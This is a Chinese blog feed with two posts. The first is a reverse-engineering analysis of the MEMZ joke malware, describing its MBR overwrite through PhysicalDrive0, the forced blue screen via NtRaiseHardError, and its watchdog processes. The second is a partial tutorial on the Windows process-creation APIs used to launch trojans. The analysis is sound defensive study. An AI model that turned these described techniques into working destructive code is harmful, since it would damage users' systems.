  
  <entry>
    <title>记一次MEMZ样本分析</title>
    <link href="http://0xnope.top/2021/04/21/%E8%AE%B0%E4%B8%80%E6%AC%A1MEMZ%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>http://0xnope.top/2021/04/21/%E8%AE%B0%E4%B8%80%E6%AC%A1MEMZ%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2021-04-21T07:38:51.000Z</published>
    <updated>2021-04-30T06:12:17.839Z</updated>
    
    <content type="html"><![CDATA[<h1 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h1><p>彩虹猫病毒是一个基本的恶搞病毒，没有采取隐藏或者免杀等技术，适合新手分析。该病毒会修改MBR主引导扇区，以此来破坏电脑的正常启动，属于MBR病毒。在修改MBR后，电脑蓝屏，Windows无法启动，一直播放一个彩虹猫的画面。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425233709.png" alt="MEMZ000"></p><h1 id="运行样本"><a href="#运行样本" class="headerlink" title="运行样本"></a>运行样本</h1><p>双击加载病毒，会出现这样的2个提示框，告知你这是一个恶搞程序，是否要运行，</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210422211004.png" alt="MEMZ001"></p><p>点击确认过后弹出记事本程序。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421155051.png" alt="MEMZ003"></p><p>之后会出现：</p><ul><li>6个MEMZ进程</li><li>多个浏览器窗口</li><li>鼠标不受控制</li><li>窗口颜色发生变化</li><li>弹出很多图标</li><li>…</li></ul><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421155104.png" alt="MEMZ004"></p><p>任意关掉一个MEMZ进程，或者关闭计算机，系统就会崩溃蓝屏，重启电脑之后，会发现无法登陆系统，一只彩虹猫随着音乐在那儿跳。这说明MBR已经被修改，无法引导操作系统的启动。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421155511.png" alt="MEMZ005"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421155520.png" alt="MEMZ006"></p><h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>首先使用PEID和ExeInfoPE对样本进行查壳，查壳结果如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421155836.png" alt="MEMZ007"></p><p>PEID查出有ASProtect壳，但是拖入ida似乎是没壳的，很奇怪。</p><p>StudyPE+查看导入表</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421160057.png" alt="MEMZ008"></p><p>导入函数中我们需要注意如下API函数：</p><table><thead><tr><th>功能</th><th>dll</th><th>API</th></tr></thead><tbody><tr><td>改变窗口</td><td>GDI32</td><td>bitblt、stretchblt</td></tr><tr><td>调用外部程序</td><td>SHELL32</td><td>ShellExecute</td></tr><tr><td>播放音乐</td><td>WINMM</td><td>PlaySoundA</td></tr><tr><td>鼠标失控</td><td>USER32</td><td>SetCursorPos、GetCursorPos</td></tr><tr><td>建立消息循环</td><td>USER32</td><td>GetMessage、TranslateMessage、DispatchMessage</td></tr><tr><td>设置消息钩子</td><td>USER32</td><td>SetWindowHookEx、UnhookWindowHookEx、CallNextHookEx</td></tr><tr><td>进程提权</td><td>ADVAPI32</td><td>OpenprocessToken、LookupPrivilegeValue、AdjustTokenPrivileges</td></tr><tr><td>遍历进程</td><td>KERNEL32</td><td>CreateToolhelp32Snapshot、Process32First、Process32Next</td></tr></tbody></table><p>将样本载入ida，整体上看<code>start()</code>函数，函数大体上是由两个if判断组成。</p><p>由于<code>start()</code>函数大体上可以分成三个部分：启动部分、watchdog部分、main部分。</p><h2 id="启动部分"><a href="#启动部分" class="headerlink" title="启动部分"></a>启动部分</h2><p>在最开始，程序先获取窗口长、宽和命令行参数。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210423163416.png" alt="MEMZ009"></p><p>由于我们第一次双击样本时自然是不带参数的，于是程序流跳转到下面两个弹窗的if判断部分。</p><p>如果用户在这两个提示窗口都点击了确认，系统则会分配局部内存对象;</p><p>以”<strong>/watch2dog</strong>“为参数创建<strong>5</strong>个名为<strong>MEMZ</strong>的进程。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210423162827.png" alt="MEMZ013"></p><p>之后以”<strong>/main</strong>“为参数再生成一个<strong>MEMZ</strong>的进程。</p><p>到这里，样本创建了6个MEMZ的进程。</p><p>然后<code>SetPriorityClass</code>函数把main进程的优先级设置为最高。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210423162845.png" alt="MEMZ014"></p><p>最后，用<code>ExitProcess</code>函数结束自己的进程。至此，启动部分结束。</p><h2 id="watchdog部分"><a href="#watchdog部分" class="headerlink" title="watchdog部分"></a>watchdog部分</h2><p>首先判断是否为”/watchdog“为参数的MEMZ进程，如果不是，创建线程，注册窗口并进行消息循环</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210424135004.png" alt="MEMZ010"></p><p>启动阶段创建的5个以“/watchdog”为参数的MEMZ进程。这5个进程一共应该创建了5个线程。我们进入sub_40114A看看这个线程具体干了些什么事。</p><h3 id="sub-40114A"><a href="#sub-40114A" class="headerlink" title="sub_40114A"></a>sub_40114A</h3><p>首先<code>LocalAlloc</code>在堆中分配空间用来存路径字符串，然后<code>GetCurrentProcess</code>获取当前进程句柄，然后<code>GetProcessImageFileNameA</code>获取进程路径。</p><p>然后一个while死循环，其中大概可以分为两个部分：</p><p><code>CreateToolhelp32Snapshot</code>拍摄进程快照，再用<code>Process32FirstW</code>和<code>Process32NextW</code>进行遍历。do-while循环统计MEMZ进程的数量，将其存入v4变量。而sleep函数的存在也使得while死循环每隔一段时间统计当前MEMZ进程的个数并存放在v4变量中。</p><p>v4存放当前遍历到的MEMZ进程数量，而v7存放上一次遍历到的MEMZ的进程的数量，一旦V4的值小于v7，代表如果我们关闭了一个MEMZ进程，那么就会被if检测语句检测到，执行sub_401021函数内容。结合之前运行病毒我们可以推测sub_401021就是蓝屏关机。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210424135233.png" alt="MEMZ011"></p><h3 id="sub-401021"><a href="#sub-401021" class="headerlink" title="sub_401021"></a>sub_401021</h3><p>这个函数就有意思了，</p><p>do-while循环20次创建了20个线程，每次sleep0.1秒；而紧接着<code>RtlAdjustPrivilege</code>提权过后<code>NtRaiseHardError</code>制造系统蓝屏；</p><p>之后<code>OpenProcessToken</code>获取进程token，<code>AdjustTokenPrivilege</code>利用得到的进程token提权过后<code>ExitWindowsEx</code>强制注销系统。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210424140759.png" alt="MEMZ012"></p><h4 id="StartAddress"><a href="#StartAddress" class="headerlink" title="StartAddress"></a>StartAddress</h4><p>线程函数指针<code>StartAddress</code>点不开，我们直接查看汇编代码如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210424142006.png" alt="MEMZ013"></p><p><code>SetWindowsHookEx</code>和<code>UnhookWindowsHookEx</code>用于给窗口下钩子，回调函数<code>fn</code>中看具体操作。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210424143327.png" alt="MEMZ016"></p><p>code=等于3代表着窗口即将被创建，lParam表示该窗口的基本信息，创建窗口之前修改当前窗口的这些信息用于随机修改窗口的位置。</p><p>有26条消息保存在lpText所指向的地址中。使用<code>sub_401A55</code>获取随机数，<code>ds:dword_402AD0</code>存放的值为0x1A，随机数对0x1A取余，结果存放在edx寄存器，以实现在26条消息中随机选取一条<code>MessageBoxA</code>弹出显示。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210424143903.png" alt="MEMZ014"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210424144101.png" alt="MEMZ015"></p><p>至此我们确认了sub_40114A函数的作用，正如我们上面的猜想，sub_40114A函数确实制造了蓝屏关机，先创建20个线程弹出大量位置和内容都随机的窗口，再蓝屏、强制关机。</p><h3 id="sub-401000"><a href="#sub-401000" class="headerlink" title="sub_401000"></a>sub_401000</h3><p>sub_401000是个回调函数。16和22分别对应窗口消息<code>WM_CLOSE</code>和<code>WM_ENDSESSION</code>，而<code>WM_CLOSE</code>或<code>WM_ENDSESSION</code>消息是在系统关机时，由操作系统发送给各个窗口。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210424144700.png" alt="MEMZ017"></p><p>如果是<code>WM_CLOSE</code>和<code>WM_ENDSESSION</code>，则调用sub_401021函数蓝屏强制关机，如果是其他消息，丢给系统默认处理函数<code>DefWindowProcW</code>。</p><p><code>sub_401021</code>这个强制关机函数在两处被调用。第一个是监测watchdog参数的MEMZ进程数量，如有减少就调用。第二个是监测用户是否主动关机，如果主动关机也调用此函数。这和我们运行阶段看到的一致。</p><h2 id="main部分"><a href="#main部分" class="headerlink" title="main部分"></a>main部分</h2><p>main部分大致也可细分为两个部分：覆盖MBR部分和10个线程部分。</p><p>我们先来看看下面的10个线程部分：</p><h3 id="10个线程部分"><a href="#10个线程部分" class="headerlink" title="10个线程部分"></a>10个线程部分</h3><p>此处的do-while循环以v8为计数器循环十次，调用<code>CreateThread</code>创建线程，创建10个线程。参数v9被赋予初始值off_405130，每次循环自增2。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425194030.png" alt="MEMZ022"></p><p>off_405130</p><p>off_405130内容如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425195220.png" alt="MEMZ023"></p><p>稍微修改一下，显示为下图这样：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425195334.png" alt="MEMZ024"></p><p>结合上面的代码，容易看出，此处数据是个结构体组成的数组，数组元素有10个，结构体大致如下：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FuncAddrDelay</span> &#123;</span></span><br><span class="line">DWORDpFuncAddr;</span><br><span class="line">  DWORDdwTimeDelay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>j结合代码，我们知道<code>CreateThread</code>创建了10个进程，每次创建有一定的延迟时间，延迟时间和进程的函数地址组成一个结构体，共10组放在一个大数组off_405130里。</p><p>然后sub_401A2B依次调用这10个函数。10个函数每个的返回值被保存在v1，每次循环都会在if语句中判断v1自减1后是否为0，其实返回值就是决定循环的次数，以及这10个函数的激活时间。这10个函数中，有的需要一个固定的激活时间，有的需要一个随机的激活时间，只需要控制返回值即v1就可以了。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425201757.png" alt="MEMZ025"></p><p>这10个函数就是打开浏览器，鼠标失控，弹窗，弹图标等等操作。下面我们来单独看看：</p><h4 id="线程1："><a href="#线程1：" class="headerlink" title="线程1："></a>线程1：</h4><p><strong>运行浏览器软件，随机打开网站浏览，运行任务管理器，注册表管理器，计算器等</strong></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425203950.png" alt="MEMZ025"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425204159.png" alt="MEMZ026"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425204322.png" alt="MEMZ027"></p><h4 id="线程2："><a href="#线程2：" class="headerlink" title="线程2："></a>线程2：</h4><p><strong>鼠标位置失控</strong></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425204647.png" alt="MEMZ028"></p><h4 id="线程3"><a href="#线程3" class="headerlink" title="线程3"></a>线程3</h4><p><strong>插入键盘事件，对键盘进行监控</strong></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425205228.png" alt="MEMZ029"></p><h4 id="线程4"><a href="#线程4" class="headerlink" title="线程4"></a>线程4</h4><p><strong>病毒运行的过程中发出声音</strong></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425205421.png" alt="MEMZ030"></p><h4 id="线程5"><a href="#线程5" class="headerlink" title="线程5"></a>线程5</h4><p><strong>改变屏幕显示复制桌面界面</strong></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425233447.png" alt="MEMZ031"></p><p>此次<code>BitBlt</code>的作用就是对桌面像素进行位块转换。</p><h4 id="线程6"><a href="#线程6" class="headerlink" title="线程6"></a>线程6</h4><p><strong>弹出“Still using this computer?”的MessageBox</strong></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425210621.png" alt="MEMZ032"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425210629.png" alt="MEMZ033"></p><h4 id="线程7"><a href="#线程7" class="headerlink" title="线程7"></a>线程7</h4><p><strong>在鼠标位置绘制图标</strong></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425212305.png" alt="MEMZ034"></p><h4 id="线程8"><a href="#线程8" class="headerlink" title="线程8"></a>线程8</h4><p><strong>枚举子窗口，将子窗口变形</strong></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425212000.png" alt="MEMZ035"></p><h4 id="线程9"><a href="#线程9" class="headerlink" title="线程9"></a>线程9</h4><p><strong>界面大小改变，桌面变形</strong></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425212732.png" alt="MEMZ036"></p><h4 id="线程10"><a href="#线程10" class="headerlink" title="线程10"></a>线程10</h4><p><strong>改变桌面颜色</strong></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425213003.png" alt="MEMZ037"></p><h3 id="覆盖MBR部分"><a href="#覆盖MBR部分" class="headerlink" title="覆盖MBR部分"></a>覆盖MBR部分</h3><p>该部分是病毒的核心部分，硬盘最开头的512字节就是MBR部分。MBR里的代码进行各种初始化工作，然后再把控制权转移给操作系统。</p><p>而该病毒覆盖MBR（Master Boot Record）主引导区，写入播放循环彩虹猫视频的代码，导致Windows系统无法启动。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210430135938.png" alt="MEMZ038"></p><p>先来看看覆盖MBR部分：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210430134330.png" alt="QQ截图20210430134251"></p><p>首先<code>CreateFileA</code>以读写权限打开文件PhysicalDrive0即主硬盘文件，再在堆中写入恶意代码，然后通过<code>WriteFile</code>将堆中的恶意代码写到PhysicalDrive0主硬盘文件。然后用<code>LocalAlloc</code>以0为初始值分配一段内存空间，拷贝两段恶意代码数据到分配的内存空间。</p><p>第一段<code>byte_402118</code>大小<strong>303</strong>字节覆盖部分MBR（或者初始化恶意代码？因为并没有完全覆盖MBR），第二段开始于510字节处，<code>byte_402248</code>大小<strong>1952</strong>字节，推测是覆盖MBR后播放的那段彩虹猫的数据。（不太清楚为什么中间跳过了206字节？）。</p><p>下面我们将这两部分数据dump出来分析。</p><p>然后作者创建了个note.txt文件，在其中写了段话，并用notepad.exe打开note.txt文件。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210425192629.png" alt="MEMZ021"></p><p>静态分析大概就这些内容，接下来我们动态调试看看该样本程序的具体流程如何。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;样本信息&quot;&gt;&lt;a href=&quot;#样本信息&quot; class=&quot;headerlink&quot; title=&quot;样本信息&quot;&gt;&lt;/a&gt;样本信息&lt;/h1&gt;&lt;p&gt;彩虹猫病毒是一个基本的恶搞病毒，没有采取隐藏或者免杀等技术，适合新手分析。该病毒会修改MBR主引导扇区，以此来破坏电脑的正常</summary>
      
    
    
    
    <category term="Reverse" scheme="http://0xnope.top/categories/Reverse/"/>
    
    
    <category term="Windows" scheme="http://0xnope.top/tags/Windows/"/>
    
    <category term="Malware_analysis" scheme="http://0xnope.top/tags/Malware-analysis/"/>
    
  </entry>
  
  <entry>
    <title>启动技术</title>
    <link href="http://0xnope.top/2021/04/10/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"/>
    <id>http://0xnope.top/2021/04/10/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/</id>
    <published>2021-04-10T14:01:08.000Z</published>
    <updated>2021-04-11T16:00:02.646Z</updated>
    
    <content type="html"><![CDATA[<p><strong>前言</strong></p><p>一切病毒木马成功植入计算机后都需要启动才能实施攻击操作，通常植入和攻击是分别放在不同模块当中的。</p><p>一般来说，植入模块成功执行，然后执行攻击模块，与此同时删除植入模块留下的痕迹。</p><h1 id="Win32API创建进程"><a href="#Win32API创建进程" class="headerlink" title="Win32API创建进程"></a>Win32API创建进程</h1><p>Ring3层，Microsoft提供了<code>CreateProcess()</code>、<code>ShellExecute()</code>、<code>WinExec()</code>等API来实现进程的创建。下面来分别看看这几个函数。</p><h2 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess()"></a>CreateProcess()</h2><p>函数声明如下：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPCSTR lpApplicationName,<span class="comment">//要执行的模块的名称。</span></span></span></span><br><span class="line"><span class="function"><span class="params">_Inout_opt_ LPSTR lpCommandLine,<span class="comment">//要执行的命令行。</span></span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,<span class="comment">//指向SECURITY_ATTRIBUTES结构的指针。</span></span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,<span class="comment">//指向SECURITY_ATTRIBUTES结构的指针。</span></span></span></span><br><span class="line"><span class="function"><span class="params">_In_ BOOL bInheritHandles,<span class="comment">//如果此参数为TRUE，则新进程将继承调用进程中的每个可继承句柄。如果参数为FALSE，则不会继承句柄。</span></span></span></span><br><span class="line"><span class="function"><span class="params">_In_ DWORD dwCreationFlags,<span class="comment">//控制优先级类别和流程创建的标志。</span></span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPVOID lpEnvironment,<span class="comment">//指向新进程的环境块的指针。</span></span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPCSTR lpCurrentDirectory,<span class="comment">//进程当前目录的完整路径。</span></span></span></span><br><span class="line"><span class="function"><span class="params">_In_ LPSTARTUPINFOA lpStartupInfo,<span class="comment">//指向STARTUPINFO或STARTUPINFOEX结构的指针 。</span></span></span></span><br><span class="line"><span class="function"><span class="params">_Out_ LPPROCESS_INFORMATION lpProcessInformation<span class="comment">//指向PROCESS_INFORMATION结构的指针。</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>参数</strong></p><h3 id="lpApplicationName"><a href="#lpApplicationName" class="headerlink" title="lpApplicationName"></a>lpApplicationName</h3><p>要执行的模块的名称。可为<strong>NULL</strong>。要运行批处理文件，将<code>lpApplicationName</code>设置为cmd.exe，并将<code>lpCommandLine</code>设置为以下参数：/c + 批处理文件的名称。</p><h3 id="lpCommandLine"><a href="#lpCommandLine" class="headerlink" title="lpCommandLine"></a>lpCommandLine</h3><p>要执行的命令行。可为NULL。若为<strong>NULL</strong>，该函数使用<code>lpApplicationName</code>指向的字符串作为命令行执行。</p><p>当上面这两个参数都不为 <strong>NULL</strong> 时，第 1 个参数指定要启动的进程 exe 文件(不带参数)，第 2 个参数指定启动进程所需参数。第 1 个参数也可以为 <strong>NULL</strong>，此时第 2 个参数就不能为 <strong>NULL</strong>，在 <code>lpCommandLine</code> 需要指定出要启动的程序名以及所接参数，彼此间以空格隔开，其中第 1 个参数即是程序名</p><h3 id="lpProcessAttributes"><a href="#lpProcessAttributes" class="headerlink" title="lpProcessAttributes"></a>lpProcessAttributes</h3><p>指向<a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)">SECURITY_ATTRIBUTES</a>结构的指针，该结构确定子进程是否可以继承返回到新进程对象的句柄。如果<code>lpProcessAttributes</code>为<strong>NULL</strong>，则不能继承该句柄。</p><h3 id="lpThreadAttributes"><a href="#lpThreadAttributes" class="headerlink" title="lpThreadAttributes"></a>lpThreadAttributes</h3><p>指向<code>SECURITY_ATTRIBUTES</code>结构的指针。该结构确定子进程是否可以继承返回到新线程对象的句柄。如果<code>lpThreadAttributes</code>为<strong>NULL</strong>，则不能继承该句柄。</p><h3 id="bInheritHandles"><a href="#bInheritHandles" class="headerlink" title="bInheritHandles"></a>bInheritHandles</h3><p>表示新进程是否从调用进程处继承了句柄。如果参数的值为 <strong>TRUE</strong>，调用进程中的每一个可继承的打开句柄都将被子进程继承。被继承的句柄与原进程拥有完全相同的值和访问权限；如果设为 <strong>FALSE</strong>，那么不继承。</p><h3 id="dwCreationFlags"><a href="#dwCreationFlags" class="headerlink" title="dwCreationFlags"></a>dwCreationFlags</h3><p>表示进程的创建标志以及优先级控制。如 ： <code>CREATE_NEW_CONSOLE</code> 会使新建的控制台程序拥有一个新的控制台； <code>DEBUG_PROCESS</code> 调用进程将被当作一个调试程序</p><p>，并且新进程会被当作被调试的进程。系统把被调试程序发生的所有调试事件通知给调试器。</p><h3 id="lpEnvironment"><a href="#lpEnvironment" class="headerlink" title="lpEnvironment"></a>lpEnvironment</h3><p>指向新进程的进程环境块（PEB）的指针。如果此参数为<strong>NULL</strong>，则新进程将使用调用进程的环境。</p><h3 id="lpCurrentDirectory"><a href="#lpCurrentDirectory" class="headerlink" title="lpCurrentDirectory"></a>lpCurrentDirectory</h3><p>指定创建后新进程的当前目录，如果设置为 NULL，那么就在父进程所在的当前目录。</p><h3 id="lpStartupInfo"><a href="#lpStartupInfo" class="headerlink" title="lpStartupInfo"></a>lpStartupInfo</h3><p>指向<a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-startupinfoa">STARTUPINFO</a>或<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-startupinfoexa">STARTUPINFOEX</a>结构的指针 。该结构里可以设定启动信息，可以设置为 NULL 。<a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-startupinfoa">STARTUPINFO</a>或<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-startupinfoexa">STARTUPINFOEX</a>中的句柄在不使用时不用由<code>CloseHandle</code>关闭。</p><h3 id="lpProcessInformation"><a href="#lpProcessInformation" class="headerlink" title="lpProcessInformation"></a>lpProcessInformation</h3><p>指向<a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-process_information">PROCESS_INFORMATION</a>结构的指针，返回被创建进程的信息。<a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-process_information">PROCESS_INFORMATION</a>中的句柄在不使用时由<code>CloseHandle</code>关闭。</p><h3 id="Return-value"><a href="#Return-value" class="headerlink" title="Return value"></a>Return value</h3><p>如果函数成功，则返回值为非零。</p><p>如果函数失败，则返回值为零。要获取扩展的错误信息，调用 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a>。</p><p>请注意，该函数在进程完成初始化之前返回。如果找不到所需的DLL或无法初始化，则该过程将终止。要获取进程的终止状态，调用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-getexitcodeprocess">GetExitCodeProcess</a>。</p><p>测试代码：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Test_CreateProcess</span><span class="params">(<span class="keyword">char</span> *exePath, <span class="keyword">int</span> CmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line"><span class="keyword">bool</span> ret = <span class="literal">false</span>;</span><br><span class="line">si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">si.wShowWindow = CmdShow;</span><br><span class="line">ret = ::CreateProcess(<span class="literal">NULL</span>, exePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"><span class="keyword">if</span>(ret) &#123;</span><br><span class="line"><span class="comment">//不使用的句柄最好关掉</span></span><br><span class="line">::CloseHandle(pi.hThread);</span><br><span class="line">::CloseHandle(pi.hProcess);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">bool</span> ret = Test_CreateProcess(<span class="string">&quot;C:\\Users\\thh\\Desktop\\test.exe&quot;</span>, SW_SHOWNORMAL);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test.exe runs successfully.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test.exe failed to run.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ShellExecute"><a href="#ShellExecute" class="headerlink" title="ShellExecute()"></a>ShellExecute()</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HINSTANCE <span class="title">ShellExecuteA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ HWND hwnd,<span class="comment">//父窗口的句柄，用于显示UI或错误消息。如果操作未与窗口关联，则此值可以为NULL。</span></span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPCSTR lpOperation,<span class="comment">//</span></span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ LPCSTR lpFile,<span class="comment">//指向以空字符结尾的字符串的指针，该字符串指定要在其上执行指定动词的文件或对象。</span></span></span></span><br><span class="line"><span class="function"><span class="params">    _In_opt_ LPCSTR lpParameters,<span class="comment">//如果lpFile指定了一个可执行文件，则此参数是指向以null终止的字符串的指针，该字符串指定要传递给应用程序的参数。</span></span></span></span><br><span class="line"><span class="function"><span class="params">    _In_opt_ LPCSTR lpDirectory,<span class="comment">//指向以null终止的字符串的指针，该字符串指定操作的默认（工作）目录。如果此值为NULL，则使用当前工作目录。使用绝对路径</span></span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ INT nShowCmd<span class="comment">//指定在打开应用程序时如何显示的标志。</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>参数</strong></p><h3 id="hwnd"><a href="#hwnd" class="headerlink" title="hwnd"></a>hwnd</h3><p>父窗口的句柄，用于显示UI或错误消息。如果操作未与窗口关联，则此值可以为NULL。</p><h3 id="lpOperation"><a href="#lpOperation" class="headerlink" title="lpOperation"></a>lpOperation</h3><p>指向以空字符串结尾的空字符串的指针，用于指定要执行的动作，一般有下：</p><p>edit：启动编辑器并打开文档进行编辑，如果lpFile不是文档文件，则该函数将失败。</p><p>explore：探索由lpFile指定的文件夹。</p><p>find：在由lpDirectory指定的目录中启动搜索。</p><p>open：打开由lpFile指定的项目，该项目可以是文件可以是文件夹。</p><p>print：打印由lpFile指定的文件，如果该文件不是文档文件，则该函数失败。</p><p>runas：以管理员身份启动应用程序。</p><p>Null：如果可用，则使用默认动词。如果不是，则使用“open”动词。如果两个动词都不可用，系统将使用注册表中列出的第一个动词。</p><h3 id="lpFile"><a href="#lpFile" class="headerlink" title="lpFile"></a>lpFile</h3><p>指向以空字符结尾的字符串的指针，该字符串指定要在其上执行指定动词的文件或对象。</p><h3 id="lpDirectory"><a href="#lpDirectory" class="headerlink" title="lpDirectory"></a>lpDirectory</h3><p>指向以<strong>null</strong>终止的字符串的指针，该字符串指定操作的默认（工作）目录。如果此值为<strong>NULL</strong>，则使用当前工作目录。如果在<em>lpFile中</em>提供了相对路径，请不要对<em>lpDirectory</em>使用相对路径。</p><h3 id="lpParameters"><a href="#lpParameters" class="headerlink" title="lpParameters"></a>lpParameters</h3><p>如果<em>lpFile</em>指定了一个可执行文件，则此参数是指向以<strong>null</strong>终止的字符串的指针，该字符串指定要传递给应用程序的参数。此字符串的格式由要调用的动词确定。如果<em>lpFile</em>指定一个文档文件，则<em>lpParameters</em>应该为<strong>NULL</strong>。</p><h3 id="nShowCmd"><a href="#nShowCmd" class="headerlink" 